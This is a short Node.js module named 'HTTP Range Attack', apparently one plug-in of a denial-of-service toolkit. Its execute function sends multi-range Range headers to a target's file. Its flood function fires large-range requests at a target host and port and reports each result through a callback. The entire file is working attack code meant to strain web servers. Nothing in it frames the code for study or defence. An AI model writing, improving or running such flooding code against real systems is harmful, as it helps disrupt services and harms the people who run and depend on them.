const http = require('http');
const https = require('https');

module.exports = {
    name: 'HTTP Range Attack',
    description: 'Requests with Range header',
    
    execute: async (target, port) => {
        const protocol = port === 443 ? https : http;
        
        return new Promise((resolve, reject) => {
            const req = protocol.request({
                hostname: target,
                port: port,
                path: '/largefile.bin',
                method: 'GET',
                headers: { 'Range': 'bytes=0-0,1-1,2-2,3-3,4-4' }
            }, (res) => {
                resolve({ status: res.statusCode, range: true });
                req.destroy();
            });
            
            req.end();
            req.on('error', reject);
        });
    },
    
    flood: (target, port, callback) => {
        const protocol = port === 443 ? https : http;
        
        const req = protocol.request({
            hostname: target,
            port: port,
            path: '/',
            headers: { 'Range': 'bytes=0-1000000' }
        }, (res) => {
            res.resume();
            req.destroy();
            callback(true);
        });
        
        req.end();
        req.on('error', () => callback(false));
    }
};